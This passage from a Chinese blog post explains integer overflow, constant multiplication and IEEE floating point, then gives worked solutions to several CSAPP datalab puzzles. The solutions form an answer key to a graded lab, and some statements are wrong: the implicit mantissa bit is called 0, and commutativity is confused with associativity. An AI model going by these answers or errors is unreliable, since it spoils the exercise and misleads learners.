，但是截断有负整数的时候就会发生意想不到的事情。比如负数最小值再减一那么做的运算就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 0x80000000</span><br><span class="line"> 0xFFFFFFFF</span><br><span class="line">0x17FFFFFFF</span><br></pre></td></tr></table></figure><p>显然多了一位，高位被截断，最终结果为 <code>0x7FFFFFFF</code> ，两个负数相加结果得出了正数，这显然超出了我们的认知范围。这个我们叫它负溢出。再看一个例子：正数的最大值加 <code>1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7FFFFFFF</span><br><span class="line">0x00000001</span><br><span class="line">0x80000000</span><br></pre></td></tr></table></figure><p>结果是负数的最大值，两个正数相加得出了负数，显然也不合理，这个我们叫他正溢出，但是正溢出并没有发生截断，而负溢出是由截断引起的。</p><blockquote><p>计算机历史上，有很多安全漏洞都是因为有符号和无符号的正数引起的</p></blockquote><h4 id="无符号乘法"><a href="#无符号乘法" class="headerlink" title="无符号乘法"></a>无符号乘法</h4><p>对于乘法有 <code>x*y=(x*y) mod 2^w</code> 其中 <code>w</code> 为 <code>x </code> 和 <code>y</code> 的位数。因为 <code>x</code> 和 <code>y</code> 相乘可能得到最大 <code>2w</code> 位的整数，因此会发生截断，对于无符号来说，截断就相当于对 <code>2^w</code> 取模 。</p><h4 id="补码乘法"><a href="#补码乘法" class="headerlink" title="补码乘法"></a>补码乘法</h4><p>这个乘法就相当于先像无符号乘法，乘出来截断之后再转为补码就是结果。</p><h4 id="乘常数"><a href="#乘常数" class="headerlink" title="乘常数"></a>乘常数</h4><p>因为我们知道一个特性：移位运算相当于对 <code>2^x</code> 做乘除法，因此利用这个特性我们能把乘法转成移位运算，执行乘法指令的时间比其它指令时间要长的多，因此很多编译器在编译常数乘法的时候会把常数二进制拆开然后分别相乘相加。</p><p>比如乘9：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>=<span class="number">0b1001</span></span><br><span class="line">x*<span class="number">9</span>=x*<span class="number">8</span>+x*<span class="number">1</span>=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p> 但是我们会发现一个问题：如果1的位数很多那就相当于要做很多次移位和加法，最后的复杂度可能跟乘法指令差不多，但是我们可以通过另外一种姿势避免这个问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span>=<span class="number">0b1111</span>=<span class="number">0b10000</span><span class="number">-0b</span>1</span><br><span class="line">x*<span class="number">15</span>=x*<span class="number">16</span>-x*<span class="number">1</span>=(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>通过借一个高位，其余位权值取反之后再加1的方式避免了进行大量的运算。</p><h4 id="除2的幂"><a href="#除2的幂" class="headerlink" title="除2的幂"></a>除2的幂</h4><p>对于2的幂，非常简单，右移运算即可，但是需要注意：除法没有分配律，所以乘常数的方式并不适用于除法。除法会向零取整，比如算出来结果为 <code>3.5</code> 则会变成 <code>3</code>，算出来结果 <code>-3.5</code> 则会变成 <code>-3</code>。</p><h3 id="浮点数表示"><a href="#浮点数表示" class="headerlink" title="浮点数表示"></a>浮点数表示</h3><p>显然整数并不能满足我们平时的需要，平时还需要进行大量的浮点数运算，达到太阳的质量，小到电子的质量，都需要能在计算机中表示。而这个范围要用整数的思路表示显然是不行的，因此我们需要有特殊的表示方法。</p><h4 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h4><p>我们都知道十进制的小数，小数点左边的数字位的权值从 <code>10^0</code> 开始，指数逐位递增，而小数点右边的数字的位的权值从 <code>10^(-1)</code> 开始，逐位递减。</p><p>二进制同理，只不过权值的底数都变成了 <code>2</code>。</p><h4 id="IEEE浮点数表示"><a href="#IEEE浮点数表示" class="headerlink" title="IEEE浮点数表示"></a>IEEE浮点数表示</h4><p>这个标准规定的浮点数用如下方式表示：</p><p><img src="/2022/06/03/CSAPP_Datalab/5.png" alt="5"></p><p>里面包含了</p><ul><li>符号(s)：<code>1</code> 表示负数，<code>0</code> 表示正数</li><li>尾数(M)：是一个二进制的小数，取值范围为 <code>[1,2)</code></li><li>阶码(E)：为浮点数加权。</li></ul><p>其实这个定义就相当于二进制的科学计数法，想想原来科学计数法的定义是不是能更清晰地理解它了呢？</p><p>讲完理论来讲点实际的：</p><p>我们知道实际上我们经常用的浮点数有两类，一类是 <code>float</code> 一类是 <code>double</code>，<code>float</code> 为 <code>32</code> 位，<code>double</code> 为 <code>64</code> 位。</p><ul><li>对于 <code>float</code>，最高位表示符号位，第 <code>2</code> 到第 <code>9</code> 位表示阶码，第 <code>10</code> 位到第 <code>32</code> 位均为尾数</li><li>对于 <code>double</code>，最高位表示符号位，第 <code>2</code> 到第 <code>12</code> 位表示阶码，第 <code>13</code> 位到第 <code>64</code> 位均为尾数</li></ul><p>我们具体以 <code>float</code> 来分析：</p><p>第一位是符号位没啥大问题。后面的八位是指数，这个指数需要能表示无穷大，也要能表示无穷小，因此指数必须有正有负。我们定义一个数 <code>Bias=2^(k-1)-1</code> 其中 <code>k</code> 为阶码的位数，在 <code>float</code> 中，这个值为 <code>127</code>，在 <code>double</code> 中，这个值为 <code>1023</code>。阶码实际值 <code>E=e-Bias</code>，其中 <code>e</code> 表示阶码本身的无符号二进制的数值。然后就是这个尾数了，因为我们的范围是 <code>[1,2)</code>，在这个范围内的小鼠，不难发现小数点前有一位一直是 <code>0</code>，因此这个 <code>0</code> 我们就不必多花一位存储它了，因此我们的尾数都是小数点后的值。</p><p>如果一个 <code>32</code> 位浮点数在内存中的二进制表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin:<span class="number">0b01000000010000000000000000000</span></span><br><span class="line">hex:<span class="number">0x40400000</span></span><br></pre></td></tr></table></figure><p>那么可以发现它是正数，阶码为 <code>128</code>，尾数为 <code>100000……</code>，因为小数点后面的0都能忽略，因此尾数实际就是 <code>1</code>。然后注意这个阶码并不是真正的实际值，这只是它表面上看上去的值，再给它减去一个 <code>127</code> 之后可以发现指数为 <code>1</code>。小数位数因为有一个隐含的 <code>1</code>，所以它的实际值为 <code>1.1</code>，十进制值就是 <code>1.5</code>，所以最后结果就是 <code>1.5*2^1=3</code>。</p><p>然后我们再运行程序看看 <code>3</code> 的字节显示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x=<span class="number">3.0</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后可以发现与我们上面书写的十六进制值一致。</p><p>浮点数还有 <code>3 </code>中表示值的情况。</p><ol><li>规格化的值：这是最普遍的情况，阶码位不为全 <code>0</code> 也不为全 <code>1</code>.</li><li>非规格化的值：当阶码位全为 <code>0</code> 的时候，表示非规格化的值，这个非规格化的意思就是跟我们上面介绍的规律稍稍有点不一样，此时尾数是不带隐含的 <code>1</code> 的，也就是说它的有效数字直接是从尾数开始的，因此它和阶码位模式为<code>00000001</code> 的指数一样，但是有效数字多一个小数点前的 <code>1</code>，因为这样表示能够使得非规格化数值向规格化数值转化更为平滑。</li><li>特殊值：包括 <code>INF</code> 和 <code>NAN</code>，阶码位全为 <code>1</code> 的时候，若尾数全为0，则得到 <code>INF</code>，若不全为 <code>0</code> 则得到 <code>NAN</code>。</li></ol><h4 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h4><p>浮点数因为表达的不是一个具体的数，只是一个近似值，因此在精度不够的情况，只能选择舍掉一些精度保证能够存储。如何舍入便成为了一项难题，目前一共有四种舍入方式：下面我们给出一些例子</p><table><thead><tr><th>方式</th><th>1.40</th><th>1.60</th><th>1.50</th><th>2.50</th><th>-1.50</th></tr></thead><tbody><tr><td>向偶数舍入</td><td>1</td><td>2</td><td>2</td><td>2</td><td>-2</td></tr><tr><td>向零舍入</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-1</td></tr><tr><td>向下舍入</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-2</td></tr><tr><td>向上舍入</td><td>2</td><td>2</td><td>2</td><td>3</td><td>-1</td></tr></tbody></table><p>后面三个方式还好，应该都能理解，主要是这个向偶数舍入，它首先满足：被舍入的值不超过最小单位的一半则丢弃，若超过一半则加上一个最小单位，若等于一半则一定会使得舍入的结果为偶数个最小计量单位。</p><h4 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h4><p>在进行浮点数加减法的时候，首先需要对阶，小阶向大阶对齐，然后尾数相加。由于特殊值的存在，浮点数加减法并不满足交换规则，因此它不是一个阿贝尔群，很多整数规律不适用。</p><p>比如最经典的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1e111-1e111!=1e111-1e111+1</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这里来回答一下之前遗留的一个问题，那就是为什么整数转为浮点数之后会有部分位相匹配。其实不难发现是因为浮点数的尾数基本是和原二进制的值一致的。比如下面的一个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1001001010101</span><br></pre></td></tr></table></figure><p>转为浮点数之后就会变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.001001010101*2^12</span><br></pre></td></tr></table></figure><p>这个尾数是与原二进制的值一致的，想到这里你肯定明白了之前的那个问题了。</p><h2 id="CSAPP-datalab"><a href="#CSAPP-datalab" class="headerlink" title="CSAPP:datalab"></a>CSAPP:datalab</h2><p>终于到了最激动的实验环节了，原先我对这本书并没有很深的了解，直接上手做的实验，不会就搜，现在看完一遍之后感觉理解很多，做实验基本也是畅通无阻。</p><p>用给定的运算符实现函数的功能，解压得到源码之后在 <code>bits.c</code> 中编写自己的代码，然后要查看结果可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$make</span><br><span class="line">$./btest</span><br></pre></td></tr></table></figure><p>实验规定并非强制，但是想获得提升还是严格遵守它给定的条件。</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许使用位运算 <code>~</code> 和 <code>&amp;</code> 实现按位异或，这个我们在上面有写过，只不过没有合在一起，稍微转换一下即可，反正实现的思想就是要位之间不一样才返回 <code>1</code>。</p><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~(~x&amp;y)&amp;~(x&amp;~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得整数的最小值，最小值就是我们喜闻乐见的 <code>-2147483648</code> 啦，但是我们稍微转换一下思路，最小就是最高位一个0，用个 <code>1</code>，然后移位运算把它移到最高位即可。</p><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>x</code> 是否为最大值，最大值应该是最小值取反，然后判断是否一样我们使用异或运算，异或只有在两边相等时才返回 <code>0</code>，我们用非运算符反一下就可以了。</p><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((~(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))^x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>x</code> 是否奇数位上全为 <code>1</code>。全 <code>1</code> 我们直接用一个立即数好了 <code>0xAAAAAAAA</code>，然后与屏蔽偶数位之后判断是否相等即可。</p><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="number">0xAAAAAAAA</span>&amp;x)^<span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现对一个数取负，取负的话就是取反再加一即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断一个整数是否在 <code>ASCII</code> 码的数字位置，再转换一下就是满足这个条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="number">-0x30</span>&gt;=<span class="number">0</span>  &amp;&amp; x<span class="number">-0x3a</span>&lt;<span class="number">0</span></span><br></pre></td></tr></table></figure><p>我们的目标就是判断 <code>x-0x30</code> 是否为非负数，<code>x-0x3a</code> 是否为负数，也许需要考虑溢出，但是结果发现不需要，因为这个是两边判断的。</p><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="comment">//x-0x30&gt;=0  &amp;&amp; x-0x3a&lt;0</span></span><br><span class="line"><span class="keyword">return</span> !((x+(~<span class="number">0x30</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&amp;!!((x+(~<span class="number">0x3a</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于实现运算 <code>x?y:z</code>，如果 <code>x</code> 为 <code>0</code> 则返回 <code>x</code>，如果不为 <code>0</code> 则返回 <code>y</code>。</p><p>我们先把 <code>x</code>取值变为只有 <code>0</code> 和 <code>-1</code>。用掩码的思路，如过结果为 <code>-1</code> 则说明位模式全为 <code>1</code>，相与的结果就是另一个数本身，如果是 <code>0</code> 则不论与谁结果都是 <code>0</code>，我们让 <code>x</code> 与 <code>y</code>，让 <code>~x</code> 与 <code>z</code>，最后得到的两个值或起来即可。<code>x</code> 如果是 <code>-1</code> 则返回 <code>y</code> ，如果是 <code>0</code> 则返回 <code>z</code>。得到 <code>x</code> 我们只要非两次，再取负即可，就达到了我们的要求了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x=~(!!x)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现一个小于等于的功能，这里需要注意的是不能直接相减，会有溢出。</p><p>因此我们选择先判断符号位，符号位一致再相减一定不会溢出，符号不一致则强行返回不一致的结果，一致则返回直接相减的结果。首先我们先拿两个变量保存符号的结果，然后再判断符号是否一致，一致则屏蔽符号的结果，不一致则屏蔽相减的结果。</p><p>这里好好再理解一下，仔细看 <code>signx^signy</code> 和 <code>!(signx^signy)</code> 如何起到屏蔽答案的效果。</p><h4 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;<span class="comment">//y-x&gt;=0</span></span><br><span class="line">    <span class="keyword">int</span> signx=!(x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> signy=!(y&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> sign=(signx^signy)&amp;signy;<span class="comment">//若不一致则返回y是否为非负数</span></span><br><span class="line">    x=x&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    y=y&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">return</span> sign|(!(((y+(~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))))&amp;(!(signx^signy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ 